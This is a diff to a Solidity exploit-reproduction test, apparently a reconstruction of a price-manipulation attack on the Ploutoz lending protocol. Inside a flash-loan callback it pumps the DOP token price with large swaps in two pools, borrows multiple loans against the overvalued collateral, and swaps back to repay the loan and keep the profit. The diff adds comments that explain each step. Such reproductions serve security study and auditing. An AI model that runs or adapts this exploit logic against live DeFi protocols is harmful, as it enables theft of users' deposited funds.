@@ -59,7 +59,6 @@ contract Ploutoz is BaseTestWithBalanceLog {
         IERC20(DOP).approve(TwindexSwapRouter, type(uint256).max);
         IERC20(BUSD).approve(PancakeRouter, type(uint256).max);
 
-        IERC20(DOP).approve(0xc9eaC733e69C7F02B4320f1C2E25a76a770EDfEb, type(uint256).max);
         IERC20(DOP).approve(pBUSD, type(uint256).max);
         IERC20(DOP).approve(pUSDT, type(uint256).max);
         IERC20(DOP).approve(pBTCB, type(uint256).max);
@@ -85,11 +84,14 @@ contract Ploutoz is BaseTestWithBalanceLog {
     }
 
     function pancakeCall(address sender, uint256 amount0Out, uint256 amount1Out, bytes memory data) external {
+        //Pump price of DOP in both pairs
         swapTokenToToken(BUSD, DOP, 1_000_000 ether, TwindexSwapRouter);
         swapTokenToToken(BUSD, DOP, 400 ether, PancakeRouter);
 
-        //Here we borrow the assets
+        //Here we borrow the assets,using few DOP which is overvalued
         borrowMultipleLoans();
+
+        //Swap enough DOP to payback flashloan and keep profit
         swapTokenToToken(DOP, BUSD, 570_625_638_619_593_832_545_805, TwindexSwapRouter);
 
         uint256 amount = 1_002_951.02 ether;
